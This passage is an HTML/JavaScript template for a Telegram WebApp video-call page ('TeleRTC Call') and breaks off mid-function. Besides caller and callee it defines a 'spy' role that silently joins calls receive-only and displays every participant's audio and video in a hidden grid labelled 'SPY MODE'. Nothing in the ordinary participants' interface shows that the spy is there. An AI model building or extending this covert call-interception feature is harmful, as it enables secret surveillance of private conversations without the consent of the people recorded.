<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover"/>
<title>TeleRTC Call</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;user-select:none;-webkit-user-select:none}
:root{
  --st:env(safe-area-inset-top,0px);
  --sb:env(safe-area-inset-bottom,0px);
  --bg:#07090f;
  --green:#2dd476;
  --red:#ff3b5c;
  --accent:#7b6ef6;
  --glass:rgba(255,255,255,.08);
  --glass-border:rgba(255,255,255,.1);
}
html,body{height:100%;width:100%;overflow:hidden;position:fixed;background:var(--bg);font-family:'Inter',system-ui,sans-serif;color:#fff;-webkit-font-smoothing:antialiased}

/* ── Hidden media ── */
#rv{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:0;background:var(--bg);display:block;opacity:0;transition:opacity .5s}
#rv.show{opacity:1}
#ra{position:fixed;left:-9999px;top:0;width:1px;height:1px}

/* ── Spy grid ── */
#spy-grid{position:fixed;inset:0;z-index:5;background:#060810;display:none;gap:2px}
#spy-grid.p1{display:flex;flex-direction:column}
#spy-grid.p1 .spy-tile{flex:1}
#spy-grid.p2{display:flex;flex-direction:column}
#spy-grid.p2 .spy-tile{flex:1}
#spy-grid.p3,#spy-grid.p4{display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;height:100%}
@media(min-width:600px){#spy-grid.p2{flex-direction:row}}
.spy-tile{position:relative;background:#111;width:100%;height:100%;overflow:hidden}
.spy-tile video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
.spy-tile audio{display:none}
.spy-lbl{position:absolute;bottom:10px;left:10px;z-index:2;font-size:11px;font-weight:700;padding:4px 12px;border-radius:100px;background:rgba(0,0,0,.65);backdrop-filter:blur(10px);border:1px solid var(--glass-border)}
.spy-ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;color:rgba(255,255,255,.3);font-size:12px}

/* ── Splash ── */
#splash{position:fixed;inset:0;z-index:300;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:0;background:linear-gradient(160deg,#0d0b17 0%,#0a0f1e 50%,#0b0d18 100%)}
.sp-bg{position:absolute;inset:0;pointer-events:none;overflow:hidden}
.sp-bg::before{content:'';position:absolute;width:600px;height:600px;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-55%);background:radial-gradient(ellipse,rgba(123,110,246,.12) 0%,transparent 65%)}
.sp-av{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,#2a2060,#162040);border:1.5px solid var(--glass-border);display:flex;align-items:center;justify-content:center;margin-bottom:20px;font-size:34px;box-shadow:0 0 0 12px rgba(123,110,246,.06),0 0 0 24px rgba(123,110,246,.03)}
.sp-name{font-size:22px;font-weight:700;letter-spacing:-.02em;margin-bottom:6px}
.sp-role{font-size:13px;color:rgba(255,255,255,.4);margin-bottom:36px}
.sp-btn{display:flex;align-items:center;justify-content:center;gap:10px;padding:15px 52px;border-radius:100px;border:none;cursor:pointer;background:var(--green);color:#fff;font-size:16px;font-weight:700;font-family:inherit;letter-spacing:-.01em;box-shadow:0 8px 28px rgba(45,212,118,.35);transition:transform .12s,box-shadow .12s;margin-bottom:16px}
.sp-btn:active{transform:scale(.94);box-shadow:0 4px 16px rgba(45,212,118,.25)}
.sp-btn svg{width:18px;height:18px;flex-shrink:0}
.sp-open{font-size:12px;color:rgba(255,255,255,.3);cursor:pointer;padding:8px 16px;border-radius:20px;transition:color .2s;border:none;background:none;font-family:inherit}
.sp-open:active{color:rgba(255,255,255,.6)}

/* ── Audio call view ── */
#audio-view{position:fixed;inset:0;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:0;background:linear-gradient(160deg,#0d0b17,#090d1c)}
#audio-view.hide{display:none}
.av-rings{position:relative;width:130px;height:130px;display:flex;align-items:center;justify-content:center;margin-bottom:28px}
.av-ring{position:absolute;border-radius:50%;border:1.5px solid rgba(123,110,246,.18);animation:ring-pulse 2.8s ease-in-out infinite}
.av-ring:nth-child(1){width:130px;height:130px;animation-delay:0s}
.av-ring:nth-child(2){width:100px;height:100px;animation-delay:.5s;border-color:rgba(123,110,246,.25)}
.av-ring:nth-child(3){width:70px;height:70px;animation-delay:1s;border-color:rgba(123,110,246,.35)}
@keyframes ring-pulse{0%,100%{opacity:.4;transform:scale(1)}50%{opacity:1;transform:scale(1.04)}}
.av-ring.active{animation:ring-active 1.2s ease-in-out infinite}
@keyframes ring-active{0%,100%{opacity:.5;transform:scale(1)}50%{opacity:1;transform:scale(1.06)}}
.av-circle{width:76px;height:76px;border-radius:50%;background:linear-gradient(135deg,#2a2060,#162040);border:2px solid rgba(123,110,246,.3);display:flex;align-items:center;justify-content:center;font-size:28px;z-index:1;flex-shrink:0}
.av-name{font-size:24px;font-weight:700;letter-spacing:-.02em;margin-bottom:8px}
.av-status{font-size:14px;color:rgba(255,255,255,.45);display:flex;align-items:center;gap:6px}
.av-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 1.6s ease-in-out infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
.av-dot.yellow{background:#ffd60a}
.av-timer{font-size:14px;font-weight:500;color:rgba(255,255,255,.55);font-variant-numeric:tabular-nums;margin-top:4px;display:none}

/* ── HUD (top bar, shown over video) ── */
#hud{position:fixed;top:0;left:0;right:0;z-index:10;padding:calc(var(--st) + 16px) 20px 14px;display:flex;align-items:center;justify-content:center;transition:opacity .4s;pointer-events:none;opacity:0}
#hud.show{opacity:1;pointer-events:auto}
.hud-timer{font-size:14px;font-weight:600;color:rgba(255,255,255,.9);font-variant-numeric:tabular-nums;background:rgba(0,0,0,.4);padding:4px 14px;border-radius:100px;backdrop-filter:blur(10px);border:1px solid var(--glass-border)}

/* ── PiP ── */
#pip{position:fixed;z-index:12;top:calc(var(--st) + 20px);right:20px;width:100px;height:148px;border-radius:14px;overflow:hidden;background:#111;border:1.5px solid rgba(255,255,255,.18);box-shadow:0 8px 28px rgba(0,0,0,.5);cursor:grab;display:none;transition:box-shadow .2s}
#pip.show{display:block}
#pip:active{cursor:grabbing;box-shadow:0 12px 36px rgba(0,0,0,.7)}
#lv{width:100%;height:100%;object-fit:cover;display:block;transform:scaleX(-1)}
.cam-placeholder{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:#111;color:rgba(255,255,255,.3);font-size:22px}

/* ── Dock ── */
#dock{position:fixed;bottom:0;left:0;right:0;padding-bottom:calc(var(--sb) + 22px);padding-top:16px;z-index:15;display:none;flex-direction:column;align-items:center;gap:10px}
#dock.show{display:flex}
.dock-row{display:flex;align-items:center;justify-content:center;gap:14px}
.btn{position:relative;overflow:hidden;width:58px;height:58px;border-radius:50%;border:1.5px solid var(--glass-border);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:3px;background:var(--glass);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);color:rgba(255,255,255,.9);transition:all .18s cubic-bezier(.18,.89,.32,1.28);box-shadow:0 4px 14px rgba(0,0,0,.2)}
.btn svg{width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
.btn-lbl{font-size:9px;font-weight:600;letter-spacing:.03em;opacity:.7;line-height:1;pointer-events:none}
.btn:active{transform:scale(.85)}
.btn.off{background:rgba(255,255,255,.95);color:#111;border-color:transparent;box-shadow:0 4px 16px rgba(255,255,255,.25)}
.btn-end{width:64px;height:64px;background:var(--red);border-color:transparent;color:#fff;box-shadow:0 6px 22px rgba(255,59,92,.4)}
.btn-end:active{background:#d91e43;transform:scale(.88)}
.rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.25);pointer-events:none;transform:scale(0);animation:rip .45s ease-out forwards}
@keyframes rip{to{transform:scale(4);opacity:0}}

/* ── Ended screen ── */
#ended{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.94);backdrop-filter:blur(30px);display:none;flex-direction:column;align-items:center;justify-content:center;gap:10px}
#ended.show{display:flex;animation:fi .4s ease}
@keyframes fi{from{opacity:0;transform:scale(1.04)}to{opacity:1;transform:scale(1)}}
.end-ico{font-size:60px;margin-bottom:6px;animation:shake .4s ease .1s both}
@keyframes shake{0%,100%{transform:rotate(0)}25%{transform:rotate(-8deg)}75%{transform:rotate(6deg)}}
.end-title{font-size:22px;font-weight:800;letter-spacing:-.03em}
.end-dur{font-size:14px;color:rgba(255,255,255,.4)}

/* ── Open-in-browser banner (Telegram only) ── */
#open-banner{position:fixed;top:calc(var(--st) + 8px);left:50%;transform:translateX(-50%);z-index:100;display:none;align-items:center;gap:7px;background:rgba(255,255,255,.07);border:1px solid var(--glass-border);backdrop-filter:blur(12px);border-radius:100px;padding:7px 16px 7px 12px;font-size:11px;font-weight:600;color:rgba(255,255,255,.7);cursor:pointer;white-space:nowrap}
#open-banner.show{display:flex}
#open-banner svg{width:14px;height:14px;flex-shrink:0;opacity:.7}
</style>
</head>
<body>

<!-- Hidden media elements -->
<video id="rv" autoplay playsinline webkit-playsinline muted></video>
<audio id="ra" autoplay playsinline webkit-playsinline></audio>

<!-- Spy grid (spy role only) -->
<div id="spy-grid"></div>

<!-- Open in browser banner (shown inside Telegram) -->
<div id="open-banner" onclick="openInBrowser()">
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
  Open in browser for best quality
</div>

<!-- Splash -->
<div id="splash">
  <div class="sp-bg"></div>
  <div class="sp-av">📞</div>
  <div class="sp-name" id="sp-name">TeleRTC Call</div>
  <div class="sp-role" id="sp-role">Tap to join</div>
  <button class="sp-btn" id="sp-btn" onclick="startSession()">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.42 2 2 0 0 1 3.6 1.24h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.82A16 16 0 0 0 16 17l.94-.94a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
    Join Call
  </button>
  <button class="sp-open" id="sp-open" onclick="openInBrowser()">🌐 Open in browser instead</button>
</div>

<!-- Audio call view -->
<div id="audio-view" class="hide">
  <div class="av-rings">
    <div class="av-ring"></div>
    <div class="av-ring"></div>
    <div class="av-ring"></div>
    <div class="av-circle" id="av-circle">👤</div>
  </div>
  <div class="av-name" id="av-name">Connecting…</div>
  <div class="av-status">
    <span class="av-dot yellow" id="av-dot"></span>
    <span id="av-status-txt">Waiting…</span>
  </div>
  <div class="av-timer" id="av-timer">00:00</div>
</div>

<!-- Video HUD -->
<div id="hud">
  <div class="hud-timer" id="htimer">00:00</div>
</div>

<!-- Local PiP -->
<div id="pip">
  <video id="lv" autoplay playsinline muted></video>
  <div class="cam-placeholder" id="cam-ph">📷</div>
</div>

<!-- Dock -->
<div id="dock">
  <div class="dock-row" id="dock-row"></div>
</div>

<!-- Ended -->
<div id="ended">
  <div class="end-ico">📵</div>
  <div class="end-title">Call Ended</div>
  <div class="end-dur" id="end-dur"></div>
</div>

<script>
const ROOM_ID = "{{ room_id }}";
const ROLE    = "{{ role }}";
const TOKEN   = "{{ token }}";
const CALLER_ID = "{{ caller_id }}";
const CALLEE_ID = "{{ callee_id }}";
const isSpy    = ROLE === 'spy';
const isCaller = ROLE === 'caller';

// ── Telegram WebApp ─────────────────────────────────────
const TG = window.Telegram?.WebApp;
if (TG) { TG.ready(); TG.expand(); }
const isInTelegram = !!(TG?.initData?.length);
if (isInTelegram) document.getElementById('open-banner').classList.add('show');

// ── Splash info ─────────────────────────────────────────
const peerName = isCaller ? CALLEE_ID : CALLER_ID;
document.getElementById('sp-name').textContent = peerName || 'Call';
document.getElementById('sp-role').textContent = isCaller ? 'You are calling' : 'Incoming call';
document.getElementById('av-name').textContent  = peerName || '…';
// Hide "Open in browser" on splash if not in Telegram
if (!isInTelegram) document.getElementById('sp-open').style.display = 'none';
// Hide PiP for spy
if (isSpy) document.getElementById('pip').style.display = 'none';

// ── Open in browser ─────────────────────────────────────
function openInBrowser() {
  const url = location.href;
  if (TG) { TG.openLink(url); return; }
  const ua = navigator.userAgent;
  if (/Android/i.test(ua)) {
    location.href = `intent:${url}#Intent;scheme=https;package=com.android.chrome;end`;
  } else {
    window.open(url, '_blank');
  }
}

// ── DOM refs ────────────────────────────────────────────
const remoteVid  = document.getElementById('rv');
const remoteAud  = document.getElementById('ra');
const localVid   = document.getElementById('lv');
const camPh      = document.getElementById('cam-ph');
const audioView  = document.getElementById('audio-view');
const pipEl      = document.getElementById('pip');
const hudEl      = document.getElementById('hud');
const htimerEl   = document.getElementById('htimer');
const dockEl     = document.getElementById('dock');
const endedEl    = document.getElementById('ended');
const endDurEl   = document.getElementById('end-dur');
const avDot      = document.getElementById('av-dot');
const avStatusTxt= document.getElementById('av-status-txt');
const avTimerEl  = document.getElementById('av-timer');
const avRings    = document.querySelectorAll('.av-ring');
const spyGrid    = document.getElementById('spy-grid');

// ── State ───────────────────────────────────────────────
let localStream = null, ws = null, micOn = true, camOn = false;
let videoTransceiver = null; // the per-peer video transceiver reference
let facingMode = 'user', isFlipping = false;
let makingOffer = false;
const pcMap = {};
const candidateQueue = {};
let myId = null;
let callConnected = false;

// ── Timer ───────────────────────────────────────────────
let _secs = 0, _timerV = null;
function startTimer() {
  if (_timerV) return; _secs = 0;
  _timerV = setInterval(() => {
    _secs++;
    const s = pad(_secs % 60), m = pad(Math.floor(_secs / 60));
    htimerEl.textContent = `${m}:${s}`;
    avTimerEl.textContent = `${m}:${s}`;
  }, 1000);
  avTimerEl.style.display = 'block';
}
function stopTimer() { clearInterval(_timerV); _timerV = null; }
function pad(n) { return String(n).padStart(2, '0'); }
function callDuration() {
  const m = Math.floor(_secs / 60), s = _secs % 60;
  return m > 0 ? `${m}m ${s}s` : `${s}s`;
}

// ── ICE + codecs ────────────────────────────────────────
let RTC = {
  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
  iceCandidatePoolSize: 10, bundlePolicy: 'max-bundle', sdpSemantics: 'unified-plan'
};
async function fetchIceServers() {
  try {
    const r = await fetch(`/api/ice_servers?token=${TOKEN}`);
    if (r.ok) { RTC = await r.json(); }
  } catch (_) {}
}
function preferCodecs(sdp, kind) {
  const lines = sdp.split('\r\n');
  const mIdx = lines.findIndex(l => l.startsWith(`m=${kind}`));
  if (mIdx === -1) return sdp;
  const order = kind === 'video' ? ['VP9','H264','VP8'] : ['opus'];
  const payloads = [];
  order.forEach(codec => {
    lines.forEach(l => {
      const m = l.match(/^a=rtpmap:(\d+) ([^/\s]+)/i);
      if (m && m[2].toUpperCase() === codec && !payloads.includes(m[1])) payloads.push(m[1]);
    });
  });
  const parts = lines[mIdx].split(' ');
  const rest = parts.slice(3).filter(p => !payloads.includes(p));
  lines[mIdx] = [...parts.slice(0, 3), ...payloads, ...rest].join(' ');
  return lines.join('\r\n');
}
async function setHighBitrate(pc) {
  for (const sender of pc.getSenders()) {
    if (!sender.track) continue;
    try {
      const p = sender.getParameters();
      if (!p.encodings?.length) p.encodings = [{}];
      if (sender.track.kind === 'video') { p.encodings[0].maxBitrate = 2500000; p.encodings[0].maxFramerate = 30; }
      else { p.encodings[0].maxBitrate = 128000; }
      await sender.setParameters(p);
    } catch (_) {}
  }
}

// ── Peers ────────────────────────────────────────────────
function drainCandidates(rid) {
  if (!candidateQueue[rid]) return;
  candidateQueue[rid].forEach(c => pcMap[rid]?.addIceCandidate(new RTCIceCandidate(c)).catch(() => {}));
  delete candidateQueue[rid];
}

function createPeer(rid, init) {
  if (pcMap[rid]) return pcMap[rid];
  const pc = new RTCPeerConnection(RTC);
  pcMap[rid] = pc;

  if (isSpy) {
    pc.addTransceiver('audio', { direction: 'recvonly' });
    pc.addTransceiver('video', { direction: 'recvonly' });
  } else if (localStream) {
    localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
  }

  pc.ontrack = e => {
    const ms = new MediaStream([e.track]);
    if (isSpy) {
      const tile = getOrCreateTile(rid);
      if (e.track.kind === 'video') { tile.vid.srcObject = ms; tile.vid.play().catch(()=>{}); tile.ph.style.display='none'; }
      else { tile.aud.srcObject = ms; tile.aud.play().catch(()=>{}); }
    } else {
      if (e.track.kind === 'video') {
        remoteVid.srcObject = ms;
        remoteVid.play().catch(() => {});
        e.track.onunmute = () => showVideoView();
        if (!e.track.muted) showVideoView();
      } else {
        remoteAud.srcObject = ms;
        remoteAud.play().catch(() => {});
        if (!callConnected) { callConnected = true; onConnected(); }
      }
    }
  };

  pc.oniceconnectionstatechange = () => {
    if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
      setHighBitrate(pc);
    }
    if ((pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') && init) {
      pc.restartIce();
    }
  };

  pc.onicecandidate = e => {
    if (e.candidate) wsSend({ type: 'candidate', to: rid, candidate: e.candidate });
  };

  if (init) {
    pc.onnegotiationneeded = async () => {
      try {
        makingOffer = true;
        const o = await pc.createOffer({ voiceActivityDetection: false });
        const sdp = preferCodecs(preferCodecs(o.sdp, 'video'), 'audio');
        await pc.setLocalDescription({ type: o.type, sdp });
        wsSend({ type: 'offer', to: rid, sdp: pc.localDescription });
      } catch (err) { console.error(err); }
      finally { makingOffer = false; }
    };
  }
  return pc;
}

// ── View transitions ─────────────────────────────────────
function showVideoView() {
  if (audioView.classList.contains('hide')) return; // already in video
  audioView.classList.add('hide');
  remoteVid.classList.add('show');
  hudEl.classList.add('show');
  startTimer();
}
function showAudioView() {
  audioView.classList.remove('hide');
  remoteVid.classList.remove('show');
  remoteVid.srcObject = null;
  hudEl.classList.remove('show');
}
function onConnected() {
  avDot.classList.remove('yellow');
  avStatusTxt.textContent = 'Audio call';
  avRings.forEach(r => r.classList.add('active'));
  startTimer();
}
function onWaiting() {
  callConnected = false;
  avDot.classList.add('yellow');
  avStatusTxt.textContent = 'Waiting…';
  avRings.forEach(r => r.classList.remove('active'));
  stopTimer();
  avTimerEl.style.display = 'none';
  showAudioView();
}

// ── Controls ─────────────────────────────────────────────
function toggleMic() {
  micOn = !micOn;
  if (localStream) localStream.getAudioTracks().forEach(t => t.enabled = micOn);
  renderDock();
}

async function toggleCam() {
  if (!localStream) return;
  if (!camOn) {
    try {
      const vs = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1280, min: 640 }, height: { ideal: 720, min: 480 }, frameRate: { ideal: 30, min: 15 } }
      });
      const vt = vs.getVideoTracks()[0];
      localStream.addTrack(vt);
      localVid.srcObject = localStream;
      localVid.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
      localVid.play().catch(() => {});
      // Add to all peer connections
      Object.values(pcMap).forEach(pc => pc.addTrack(vt, localStream));
      camOn = true;
      camPh.style.display = 'none';
      pipEl.classList.add('show');
    } catch (e) { console.error('Camera:', e); return; }
  } else {
    localStream.getVideoTracks().forEach(t => { t.stop(); localStream.removeTrack(t); });
    localVid.srcObject = null;
    camOn = false;
    pipEl.classList.remove('show');
  }
  renderDock();
}

async function flipCam() {
  if (!camOn || isFlipping) return;
  isFlipping = true;
  facingMode = facingMode === 'user' ? 'environment' : 'user';
  try {
    const ns = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } }
    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode } }));
    const nt = ns.getVideoTracks()[0];
    const ot = localStream.getVideoTracks()[0];
    if (ot) { ot.stop(); localStream.removeTrack(ot); }
    localStream.addTrack(nt);
    localVid.srcObject = localStream;
    localVid.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
    Object.values(pcMap).forEach(pc => {
      const s = pc.getSenders().find(s => s.track?.kind === 'video');
      if (s) s.replaceTrack(nt).catch(() => {});
    });
  } catch (_) { facingMode = facingMode === 'user' ? 'environment' : 'user'; }
  isFlipping = false;
  renderDock();
}

function endCall() {
  const dur = callDuration();
  Object.values(pcMap).forEach(p => p.close());
  if (localStream) localStream.getTracks().forEach(t => t.stop());
  wsSend({ type: 'room_ended' });
  if (ws) ws.close();
  stopTimer();
  endedEl.classList.add('show');
  endDurEl.textContent = _secs > 0 ? `Duration: ${dur}` : '';
  setTimeout(() => {
    try { if (TG?.initData) TG.close(); } catch (_) {}
    window.close();
    setTimeout(() => window.history.back(), 400);
  }, 1600);
}

// ── Dock render ──────────────────────────────────────────
function renderDock() {
  const row = document.getElementById('dock-row');
  if (!row) return;
  if (isSpy) {
    row.innerHTML = `<span style="font-size:11px;font-weight:700;letter-spacing:.08em;color:rgba(255,59,92,.85);text-transform:uppercase">👁 SPY MODE</span>`;
    return;
  }
  row.innerHTML = `
    ${camOn ? `<button class="btn" id="btn-flip" onclick="flipCam()">
      <svg viewBox="0 0 24 24"><path d="M1 4v6h6"/><path d="M23 20v-6h-6"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/></svg>
      <span class="btn-lbl">Flip</span>
    </button>` : '<div style="width:58px"></div>'}
    <button class="btn ${camOn ? '' : 'off'}" id="btn-cam" onclick="toggleCam()">
      ${camOn
        ? `<svg viewBox="0 0 24 24"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>`
        : `<svg viewBox="0 0 24 24"><line x1="2" x2="22" y1="2" y2="22"/><path d="M7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16"/><path d="M9.5 4h5L17 7h3a2 2 0 0 1 2 2v7.5"/><path d="M14.12 14.12A3 3 0 0 1 9.88 9.88"/></svg>`}
      <span class="btn-lbl">${camOn ? 'Camera' : 'Camera'}</span>
    </button>
    <button class="btn ${micOn ? '' : 'off'}" id="btn-mic" onclick="toggleMic()">
      ${micOn
        ? `<svg viewBox="0 0 24 24"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg>`
        : `<svg viewBox="0 0 24 24"><line x1="2" x2="22" y1="2" y2="22"/><path d="M18.89 13.23A7.12 7.12 0 0 0 19 12v-2"/><path d="M5 10v2a7 7 0 0 0 12 5"/><path d="M15 9.34V5a3 3 0 0 0-5.68-1.33"/><path d="M9 9v3a3 3 0 0 0 5.12 2.12"/><line x1="12" x2="12" y1="19" y2="22"/></svg>`}
      <span class="btn-lbl">${micOn ? 'Mute' : 'Unmute'}</span>
    </button>
    <button class="btn btn-end" onclick="endCall()">
      <svg viewBox="0 0 24 24"><path d="M10.68 13.31a16 16 0 0 0 3.41 2.6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7 2 2 0 0 1 1.72 2v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.42 19.42 0 0 1-3.33-2.67m-2.67-3.34a19.79 19.79 0 0 1-3.07-8.63A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91"/><line x1="22" x2="2" y1="2" y2="22"/></svg>
      <span class="btn-lbl">End</span>
    </button>`;
  // Add ripple to all buttons
  row.querySelectorAll('.btn').forEach(b => b.addEventListener('pointerdown', e => {
    const r = b.getBoundingClientRect(), d = Math.max(r.width, r.height), sp = document.createElement('span');
    sp.className = 'rip'; Object.assign(sp.style, { width: d+'px', height: d+'px', left: (e.clientX-r.left-d/2)+'px', top: (e.clientY-r.top-d/2)+'px' });
    b.append(sp); sp.addEventListener('animationend', () => sp.remove());
  }));
}

// ── Draggable PiP ─────────────────────────────────────────
function makeDraggable(el) {
  let sx, sy, sl, st, dragging = false;
  function start(x, y) {
    const r = el.getBoundingClientRect();
    sx = x; sy = y; sl = r.left; st = r.top;
    el.style.left = sl+'px'; el.style.top = st+'px';
    el.style.right = 'auto'; el.style.bottom = 'auto';
    dragging = true;
  }
  function move(x, y) {
    if (!dragging) return;
    el.style.left = Math.max(8, Math.min(sl+x-sx, innerWidth-el.offsetWidth-8))+'px';
    el.style.top  = Math.max(8, Math.min(st+y-sy, innerHeight-el.offsetHeight-8))+'px';
  }
  const end = () => dragging = false;
  el.addEventListener('mousedown', e => { start(e.clientX, e.clientY); e.preventDefault(); });
  window.addEventListener('mousemove', e => move(e.clientX, e.clientY));
  window.addEventListener('mouseup', end);
  el.addEventListener('touchstart', e => { const t = e.touches[0]; start(t.clientX, t.clientY); }, { passive: true });
  window.addEventListener('touchmove', e => { if (!dragging) return; const t = e.touches[0]; move(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
  window.addEventListener('touchend', end);
}
makeDraggable(pipEl);

// ── Auto-hide controls on video ──────────────────────────
let hideT;
function showControls() { hudEl.classList.add('show'); dockEl.classList.add('show'); /* dock is always show when active */ }
function schedHide() {
  clearTimeout(hideT);
  if (!remoteVid.srcObject) return; // don't hide in audio mode
  hideT = setTimeout(() => hudEl.classList.remove('show'), 4000);
}
['touchstart','mousedown'].forEach(ev => document.addEventListener(ev, () => { if (remoteVid.srcObject) { hudEl.classList.add('show'); schedHide(); } }, { passive: true }));

// ── WebSocket ─────────────────────────────────────────────
function connectWS() {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  ws = new WebSocket(`${proto}://${location.host}/ws/${ROOM_ID}?role=${ROLE}&token=${TOKEN}`);
  ws.onopen = () => {};
  ws.onmessage = async e => { let d; try { d = JSON.parse(e.data); } catch { return; } await handle(d); };
  ws.onclose = () => {
    Object.values(pcMap).forEach(p => { try { p.close(); } catch (_) {} });
    Object.keys(pcMap).forEach(k => delete pcMap[k]);
    setTimeout(connectWS, 3000);
  };
}
function wsSend(d) { if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(d)); }

// ── Signaling ─────────────────────────────────────────────
async function handle(d) {
  switch (d.type) {
    case 'room_state':
      myId = d.peer_id;
      if (isCaller) d.peers.filter(p => !p.startsWith('spy_')).forEach(p => createPeer(p, true));
      else if (isSpy) d.peers.forEach(p => createPeer(p, true));
      break;

    case 'peer_joined':
      if (d.peer_id === myId) break;
      if (isCaller || isSpy) createPeer(d.peer_id, true);
      else createPeer(d.peer_id, false);
      break;

    case 'peer_left':
      if (pcMap[d.peer_id]) { pcMap[d.peer_id].close(); delete pcMap[d.peer_id]; }
      delete candidateQueue[d.peer_id];
      if (isSpy) removeTile(d.peer_id);
      else onWaiting();
      break;

    case 'offer':
      if (d.to !== myId) break;
      {
        const pc = createPeer(d.from, false);
        try {
          await pc.setRemoteDescription(new RTCSessionDescription(d.sdp));
          drainCandidates(d.from);
          const a = await pc.createAnswer({ voiceActivityDetection: false });
          const sdp = preferCodecs(preferCodecs(a.sdp,'video'),'audio');
          await pc.setLocalDescription({ type: a.type, sdp });
          wsSend({ type: 'answer', to: d.from, sdp: pc.localDescription });
        } catch (e) { console.error(e); }
      }
      break;

    case 'answer':
      if (d.to !== myId) break;
      try {
        await pcMap[d.from]?.setRemoteDescription(new RTCSessionDescription(d.sdp));
        drainCandidates(d.from);
      } catch (e) { console.error(e); }
      break;

    case 'candidate':
      if (d.to !== myId) break;
      try {
        const pc = pcMap[d.from];
        if (pc?.remoteDescription?.type) await pc.addIceCandidate(new RTCIceCandidate(d.candidate));
        else { if (!candidateQueue[d.from]) candidateQueue[d.from] = []; candidateQueue[d.from].push(d.candidate); }
      } catch (_) {}
      break;

    case 'room_ended':
      endCall();
      break;
  }
}

// ── Spy tiles ─────────────────────────────────────────────
const spyTiles = {};
function updateGrid() {
  const n = Object.keys(spyTiles).length;
  spyGrid.className = 'p' + Math.max(1, Math.min(n, 4));
}
function getOrCreateTile(rid) {
  if (spyTiles[rid]) return spyTiles[rid];
  const tile = document.createElement('div'); tile.className = 'spy-tile';
  const vid = document.createElement('video'); vid.autoplay = true; vid.playsInline = true; vid.muted = true;
  const aud = document.createElement('audio'); aud.autoplay = true;
  const ph = document.createElement('div'); ph.className = 'spy-ph'; ph.innerHTML = '<div style="font-size:28px;opacity:.3">👤</div>';
  const lbl = document.createElement('div'); lbl.className = 'spy-lbl'; lbl.textContent = rid.slice(0,10)+'…';
  tile.append(vid, aud, ph, lbl);
  spyGrid.appendChild(tile);
  const t = { tile, vid, aud, ph, lbl };
  spyTiles[rid] = t; updateGrid(); return t;
}
function removeTile(rid) {
  if (!spyTiles[rid]) return;
  spyTiles[rid].tile.remove(); delete spyTiles[rid]; updateGrid();
}

// ── Session start ─────────────────────────────────────────
async function startSession() {
  document.getElementById('splash').style.display = 'none';
  document.getElementById('open-banner').classList.remove('show');
  audioView.classList.remove('hide');
  dockEl.classList.add('show');
  renderDock();

